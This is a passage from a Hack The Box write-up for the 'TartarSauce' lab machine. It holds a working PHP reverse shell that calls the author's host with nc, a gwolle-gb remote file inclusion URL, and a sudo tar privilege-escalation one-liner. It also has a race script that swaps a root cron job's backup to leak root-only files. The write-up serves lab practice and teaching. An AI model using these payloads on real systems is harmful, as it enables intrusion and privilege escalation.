</span></span></span><span class=line><span class=cl><span class=s1>[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
</span></span></span><span class=line><span class=cl><span class=s1> | Found By: Emoji Settings (Passive Detection)
</span></span></span><span class=line><span class=cl><span class=s1> |  - http://10.10.10.88/webservices/wp/, Match: &#39;</span>wp-includes<span class=se>\/</span>js<span class=se>\/</span>wp-emoji-release.min.js?ver<span class=o>=</span>4.9.4<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1> | Confirmed By: Meta Generator (Passive Detection)
</span></span></span><span class=line><span class=cl><span class=s1> |  - http://10.10.10.88/webservices/wp/, Match: &#39;</span>WordPress 4.9.4<span class=err>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>i<span class=o>]</span> The main theme could not be detected.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Enumerating All Plugins <span class=o>(</span>via Passive Methods<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>i<span class=o>]</span> No plugins Found.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> No WPScan API Token given, as a result vulnerability data has not been output.
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> You can get a free API token with <span class=m>25</span> daily requests by registering at https://wpscan.com/register
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Finished: Sat Sep  <span class=m>2</span> 11:37:18 <span class=m>2023</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Requests Done: <span class=m>2</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Cached Requests: <span class=m>27</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Data Sent: <span class=m>654</span> B
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Data Received: 1.055 KB
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Memory used: 259.656 MB
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Elapsed time: 00:00:01
</span></span></code></pre></div><p>Doesnt find any plugin so I start other fuzz with a SecLists plugin wordlist in order to enumerate existent plugins.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -w ~/Documents/wordlists/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -u http://10.10.10.88/webservices/wp/FUZZ  -c -v -t <span class=m>200</span> -o fuzz3 <span class=p>|</span> tee fuzz3.save
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 139ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=p>|</span> URL <span class=p>|</span> http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
</span></span><span class=line><span class=cl>    * FUZZ: wp-content/plugins/akismet/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 143ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=p>|</span> URL <span class=p>|</span> http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
</span></span><span class=line><span class=cl>    * FUZZ: wp-content/plugins/gwolle-gb/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 147ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=p>|</span> URL <span class=p>|</span> http://10.10.10.88/webservices/wp/wp-content/plugins/hello.php/
</span></span><span class=line><span class=cl>    * FUZZ: wp-content/plugins/hello.php/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 147ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=p>|</span> URL <span class=p>|</span> http://10.10.10.88/webservices/wp/wp-content/plugins/hello.php
</span></span><span class=line><span class=cl>    * FUZZ: wp-content/plugins/hello.php
</span></span></code></pre></div><p>We have two plugins but we dont know if they are vulnerable.</p><h2 id=exploiting>Exploiting<a hidden class=anchor aria-hidden=true href=#exploiting>#</a></h2><p>Searching on <strong>searchsploit</strong> I found one <strong>RFI</strong> exploit for <strong>gwolle-gb.</strong></p><p><img loading=lazy src=/HTB/tartar-3.png alt=Untitled></p><p>That exploit takes advantage of improper sanitation of abspath <strong>GET</strong> parameter allowing us to access to a remote php file named <strong>wp-load.php.</strong></p><p>I changed a little bit the <strong>URL</strong> adding <code>/webservices/wp/</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath<span class=o>=</span>http://10.10.14.9/
</span></span></code></pre></div><p>So I created a php one line reverse shell and changed his name to <strong>wp-load.php.</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=s2>&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.9 4444 &gt;/tmp/f&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>Once done I started a <strong>python http server</strong>, set a <strong>nc</strong> listener and send a request to the <strong>RFI URL</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>python3</span> <span class=o>-</span><span class=nx>m</span> <span class=nx>http</span><span class=o>.</span><span class=nx>server</span> <span class=mi>80</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>nc</span> <span class=o>-</span><span class=nx>lv</span> <span class=mi>4444</span>
</span></span></code></pre></div><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p><img loading=lazy src=/HTB/tartar-4.png alt=Untitled></p><p>We are <strong>www-data</strong> now.</p><p>Navigating to the homes directory we can see one folder called <strong>onuma</strong>.</p><p>When I tried to access in order to cat the users flag I receive the following error.</p><p><img loading=lazy src=/HTB/tartar-7.png alt=Untitled></p><p>This is a sign that we need to <strong>privEsc</strong>.</p><h2 id=escalating-privilege>Escalating Privilege<a hidden class=anchor aria-hidden=true href=#escalating-privilege>#</a></h2><p>First I checked for <code>sudo -l</code> privileges.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> www-data on TartarSauce:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User www-data may run the following commands on TartarSauce:
</span></span><span class=line><span class=cl>    <span class=o>(</span>onuma<span class=o>)</span> NOPASSWD: /bin/tar
</span></span></code></pre></div><p>We can use <code>/bin/tar</code> as <strong>onuma</strong> and looking up on GTFOBins we can see that is possible to <strong>privEsc</strong> with the following command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo -u onuma tar -cf /dev/null /dev/null --checkpoint<span class=o>=</span><span class=m>1</span> --checkpoint-action<span class=o>=</span><span class=nv>exec</span><span class=o>=</span>/bin/sh
</span></span></code></pre></div><p><img loading=lazy src=/HTB/tartar-5.png alt=Untitled></p><p><img loading=lazy src=/HTB/tartar-6.png alt=Untitled></p><p><img loading=lazy src=/HTB/tartar-8.png alt=Untitled></p><p>At <strong>onuma</strong>s home directory we can see a <strong>.mysql_history</strong> file which seems not empty.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>_HiStOrY_V2_
</span></span><span class=line><span class=cl>create<span class=se>\0</span>40database<span class=se>\0</span>40backuperer<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>exit</span>
</span></span></code></pre></div><p>It seems like is trying to create a database called <strong>backuperer</strong>.</p><p>I tried to run mysql command with common credentials but failed.</p><p>So I used <strong>moniProc.sh</strong> which is a bash script which I used in a lot of writeups in order to see scheduled processes.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; /usr/sbin/CRON -f
</span></span><span class=line><span class=cl>&gt; /bin/bash /usr/sbin/backuperer
</span></span><span class=line><span class=cl>&gt; /lib/systemd/systemd-udevd
</span></span><span class=line><span class=cl>&gt; /lib/systemd/systemd-udevd
</span></span><span class=line><span class=cl>&gt; /lib/systemd/systemd-udevd
</span></span><span class=line><span class=cl>&gt; /lib/systemd/systemd-udevd
</span></span><span class=line><span class=cl>&gt; /lib/systemd/systemd-udevd
</span></span><span class=line><span class=cl>&lt; /lib/systemd/systemd-udevd
</span></span><span class=line><span class=cl>&lt; /lib/systemd/systemd-udevd
</span></span><span class=line><span class=cl>&lt; /lib/systemd/systemd-udevd
</span></span><span class=line><span class=cl>&lt; /lib/systemd/systemd-udevd
</span></span><span class=line><span class=cl>&lt; /lib/systemd/systemd-udevd
</span></span><span class=line><span class=cl>&gt; /bin/bash /usr/sbin/backuperer
</span></span><span class=line><span class=cl>&lt; /bin/bash /usr/sbin/backuperer
</span></span><span class=line><span class=cl>&gt; /usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.a0a3b766a63bc5f8a1f3b9249c17a481ee819547 /var/www/html
</span></span><span class=line><span class=cl>&gt; /bin/sleep <span class=m>30</span>
</span></span><span class=line><span class=cl>&gt; /bin/tar -zcvf /var/tmp/.a0a3b766a63bc5f8a1f3b9249c17a481ee819547 /var/www/html
</span></span><span class=line><span class=cl>&gt; gzip
</span></span><span class=line><span class=cl>&lt; /usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.a0a3b766a63bc5f8a1f3b9249c17a481ee819547 /var/www/html
</span></span><span class=line><span class=cl>&lt; /bin/tar -zcvf /var/tmp/.a0a3b766a63bc5f8a1f3b9249c17a481ee819547 /var/www/html
</span></span><span class=line><span class=cl>&lt; gzip
</span></span></code></pre></div><p>We can observe with the <strong>moniProc.sh</strong> output that we have a cronjob executing on the background a bash script located at <strong>/usr/sbin/backuperer.</strong></p><p>Its the second time we see such name on the machine and I don&rsquo;t think it&rsquo;s a coincidence.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>#-------------------------------------------------------------------------------------</span>
</span></span><span class=line><span class=cl><span class=c1># backuperer ver 1.0.2 - by g头图</span>
</span></span><span class=line><span class=cl><span class=c1># ONUMA Dev auto backup program</span>
</span></span><span class=line><span class=cl><span class=c1># This tool will keep our webapp backed up incase another skiddie defaces us again.</span>
</span></span><span class=line><span class=cl><span class=c1># We will be able to quickly restore from a backup in seconds ;P</span>
</span></span><span class=line><span class=cl><span class=c1>#-------------------------------------------------------------------------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set Vars Here</span>
</span></span><span class=line><span class=cl><span class=nv>basedir</span><span class=o>=</span>/var/www/html
</span></span><span class=line><span class=cl><span class=nv>bkpdir</span><span class=o>=</span>/var/backups
</span></span><span class=line><span class=cl><span class=nv>tmpdir</span><span class=o>=</span>/var/tmp
</span></span><span class=line><span class=cl><span class=nv>testmsg</span><span class=o>=</span><span class=nv>$bkpdir</span>/onuma_backup_test.txt
</span></span><span class=line><span class=cl><span class=nv>errormsg</span><span class=o>=</span><span class=nv>$bkpdir</span>/onuma_backup_error.txt
</span></span><span class=line><span class=cl><span class=nv>tmpfile</span><span class=o>=</span><span class=nv>$tmpdir</span>/.<span class=k>$(</span>/usr/bin/head -c100 /dev/urandom <span class=p>|</span>sha1sum<span class=p>|</span>cut -d<span class=s1>&#39; &#39;</span> -f1<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nv>check</span><span class=o>=</span><span class=nv>$tmpdir</span>/check
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># formatting</span>
</span></span><span class=line><span class=cl>printbdr<span class=o>()</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> n in <span class=k>$(</span>seq 72<span class=k>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span> /usr/bin/printf <span class=s2>$&#34;-&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>done</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl><span class=nv>bdr</span><span class=o>=</span><span class=k>$(</span>printbdr<span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Added a test file to let us see when the last backup was run</span>
</span></span><span class=line><span class=cl>/usr/bin/printf $<span class=s2>&#34;</span><span class=nv>$bdr</span><span class=s2>\nAuto backup backuperer backup last ran at : </span><span class=k>$(</span>/bin/date<span class=k>)</span><span class=s2>\n</span><span class=nv>$bdr</span><span class=s2>\n&#34;</span> &gt; <span class=nv>$testmsg</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Cleanup from last time.</span>
</span></span><span class=line><span class=cl>/bin/rm -rf <span class=nv>$tmpdir</span>/.* <span class=nv>$check</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Backup onuma website dev files.</span>
</span></span><span class=line><span class=cl>/usr/bin/sudo -u onuma /bin/tar -zcvf <span class=nv>$tmpfile</span> <span class=nv>$basedir</span> <span class=p>&amp;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Added delay to wait for backup to complete if large files get added.</span>
</span></span><span class=line><span class=cl>/bin/sleep <span class=m>30</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Test the backup integrity</span>
</span></span><span class=line><span class=cl>integrity_chk<span class=o>()</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    /usr/bin/diff -r <span class=nv>$basedir</span> <span class=nv>$check$basedir</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/bin/mkdir <span class=nv>$check</span>
</span></span><span class=line><span class=cl>/bin/tar -zxvf <span class=nv>$tmpfile</span> -C <span class=nv>$check</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[[</span> <span class=k>$(</span>integrity_chk<span class=k>)</span> <span class=o>]]</span>
</span></span><span class=line><span class=cl><span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=c1># Report errors so the dev can investigate the issue.</span>
</span></span><span class=line><span class=cl>    /usr/bin/printf $<span class=s2>&#34;</span><span class=nv>$bdr</span><span class=s2>\nIntegrity Check Error in backup last ran :  </span><span class=k>$(</span>/bin/date<span class=k>)</span><span class=s2>\n</span><span class=nv>$bdr</span><span class=s2>\n</span><span class=nv>$tmpfile</span><span class=s2>\n&#34;</span> &gt;&gt; <span class=nv>$errormsg</span>
</span></span><span class=line><span class=cl>    integrity_chk &gt;&gt; <span class=nv>$errormsg</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>2</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=c1># Clean up and save archive to the bkpdir.</span>
</span></span><span class=line><span class=cl>    /bin/mv <span class=nv>$tmpfile</span> <span class=nv>$bkpdir</span>/onuma-www-dev.bak
</span></span><span class=line><span class=cl>    /bin/rm -rf <span class=nv>$check</span> .*
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span></code></pre></div><p>Basically the program starts removing all the content starting with a dot on <code>/var/tmp</code> and the <code>/var/tmp/check</code> directory then creates a tar of <code>/var/www/html</code> with a name started with a dot followed by a hash and saves the backup temporarily on <code>/var/tmp.</code></p><p>Once done the program sleeps 30 seconds and after that extracts the backup content on <code>/var/tmp/check</code> in order to check the integrity.</p><p>Once extracted the program checks if the integrity_chk() function output something which basically runs a diff of the files extracted and the files on</p><p><code>/var/www/html</code>.</p><p>If the file are modified the diff function output is saved on <code>/var/backups/onuma_backup_error.txt</code></p><p>If nothing is outputted by the integrity_chk() function the zip file is saved on <code>/var/backups/onuma-www-dev.bak</code></p><p>Finally all the content starting with a dot and the <code>/var/check</code> directory is removed.</p><p>So I realized as we can write on <code>/var/tmp</code> and backuperer is executed as root if we try to get the hash of the file and change the backup files to other one a little bit modified we can get information leak by diff function at <code>/var/backups/onuma_backup_error.txt</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>watch -n <span class=m>1</span> ls -la /var/tmp
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Every 1.0s: ls -la /var/tmp                                                                                                                                                             Sat Sep  <span class=m>2</span> 07:36:11 <span class=m>2023</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>total <span class=m>11284</span>
</span></span><span class=line><span class=cl>drwxrwxrwt <span class=m>10</span> root  root      <span class=m>4096</span> Sep  <span class=m>2</span> 07:36 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>14</span> root  root      <span class=m>4096</span> May <span class=m>12</span>  <span class=m>2022</span> ..
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> onuma onuma <span class=m>11511296</span> Sep  <span class=m>2</span> 07:36 .0beccd6f392b2e0f1a5676f11cbe845f4d5c5814
</span></span><span class=line><span class=cl>drwx------  <span class=m>3</span> root  root      <span class=m>4096</span> May <span class=m>12</span>  <span class=m>2022</span> systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
</span></span><span class=line><span class=cl>drwx------  <span class=m>3</span> root  root      <span class=m>4096</span> May <span class=m>12</span>  <span class=m>2022</span> systemd-private-4e3fb5c5d5a044118936f5728368dfc7-systemd-timesyncd.service-SksmwR
</span></span><span class=line><span class=cl>drwx------  <span class=m>3</span> root  root      <span class=m>4096</span> May <span class=m>12</span>  <span class=m>2022</span> systemd-private-7bbf46014a364159a9c6b4b5d58af33b-systemd-timesyncd.service-UnGYDQ
</span></span><span class=line><span class=cl>drwx------  <span class=m>3</span> root  root      <span class=m>4096</span> May <span class=m>12</span>  <span class=m>2022</span> systemd-private-9214912da64b4f9cb0a1a78abd4b4412-systemd-timesyncd.service-bUTA2R
</span></span><span class=line><span class=cl>drwx------  <span class=m>3</span> root  root      <span class=m>4096</span> May <span class=m>12</span>  <span class=m>2022</span> systemd-private-a3f6b992cd2d42b6aba8bc011dd4aa03-systemd-timesyncd.service-3oO5Td
</span></span><span class=line><span class=cl>drwx------  <span class=m>3</span> root  root      <span class=m>4096</span> Sep  <span class=m>2</span> 05:14 systemd-private-af355da20cf24e91b8a040c8e7aa1462-systemd-timesyncd.service-NYmoBL
</span></span><span class=line><span class=cl>drwx------  <span class=m>3</span> root  root      <span class=m>4096</span> May <span class=m>12</span>  <span class=m>2022</span> systemd-private-c11c7cccc82046a08ad1732e15efe497-systemd-timesyncd.service-QYRKER
</span></span><span class=line><span class=cl>drwx------  <span class=m>3</span> root  root      <span class=m>4096</span> May <span class=m>12</span>  <span class=m>2022</span> systemd-private-e11430f63fc04ed6bd67ec90687cb00e-systemd-timesyncd.service-PYhxgX
</span></span></code></pre></div><p>Thanks to the previous command we can see every second the changes on the directory.</p><p>Theres one file named with a dot and followed by 40 characters. So we only need a <strong>regex</strong> for it</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ls -la /var/tmp <span class=p>|</span> grep -oP <span class=s1>&#39;\.\w{40}&#39;</span>
</span></span></code></pre></div><p>The above command help us to list that type of files.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>while</span> true<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=nv>filename</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>ls -la /var/tmp/ <span class=p>|</span> grep -oP <span class=s1>&#39;\.\w{40}&#39;</span><span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$filename</span><span class=s2>&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;Found a file with a hash in the name&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;Removing file...&#34;</span>
</span></span><span class=line><span class=cl>        rm /var/tmp/<span class=nv>$filename</span>
</span></span><span class=line><span class=cl>		<span class=nb>echo</span> <span class=s2>&#34;Changing the file...&#34;</span>
</span></span><span class=line><span class=cl>        mv payload /var/tmp/<span class=nv>$filename</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;Done&#34;</span>
</span></span><span class=line><span class=cl>				<span class=nb>exit</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></div><p>So with the following exploit we can save the hash name on a variable and rename or payload file in order to change the backup file.</p><p>Now the thing is to build a backup payload, first I am going to tar the <code>/var/www/html</code> folder and send it via python http server.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tar -zcvf payload /var/www/html
</span></span></code></pre></div><p>Once done lets extracted with</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tar -zxvf payload .
</span></span></code></pre></div><p><img loading=lazy src=/HTB/tartar-9.png alt=Untitled></p><p>Now we only need to delete the existent index.html file and put as sudo a soft link to <code>/root/root.txt</code> as we are on our system we are able to do it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rm index.html
</span></span><span class=line><span class=cl>sudo su
</span></span><span class=line><span class=cl>ln -s /root/root.txt index.html
</span></span></code></pre></div><p>Once executed we have now the modified backup file, now when the programs runs a diff with our modified data its gonna leak the root.txt flag.</p><p>We need now to send the crafted exploit and the payload previously zipped with tar to the remote machine in the same directory.</p><p><img loading=lazy src=/HTB/tartar-10.png alt=Untitled></p><p>Once executed we receive the waited output.</p><p>Lets check <code>/var/backups/onuma_backup_error.txt</code> for the <strong>roots flag</strong>.</p><p><img loading=lazy src=/HTB/tartar-11.png alt=Untitled></p><p><strong>Thank you for reading, and happy hacking! </strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://pwndside.github.io/tags/privesc/>privesc</a></li><li><a href=https://pwndside.github.io/tags/web/>web</a></li><li><a href=https://pwndside.github.io/tags/linux/>linux</a></li><li><a href=https://pwndside.github.io/tags/scripting/>scripting</a></li></ul><nav class=paginav><a class=next href=https://pwndside.github.io/posts/sunday-htb/><span class=title>Next 禄</span><br><span>Sunday</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share TartarSauce on twitter" href="https://twitter.com/intent/tweet/?text=TartarSauce&amp;url=https%3a%2f%2fpwndside.github.io%2fposts%2ftartarsauce-htb%2f&amp;hashtags=privesc%2cweb%2clinux%2cscripting"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TartarSauce on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fpwndside.github.io%2fposts%2ftartarsauce-htb%2f&amp;title=TartarSauce&amp;summary=TartarSauce&amp;source=https%3a%2f%2fpwndside.github.io%2fposts%2ftartarsauce-htb%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TartarSauce on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fpwndside.github.io%2fposts%2ftartarsauce-htb%2f&title=TartarSauce"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TartarSauce on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fpwndside.github.io%2fposts%2ftartarsauce-htb%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TartarSauce on whatsapp" 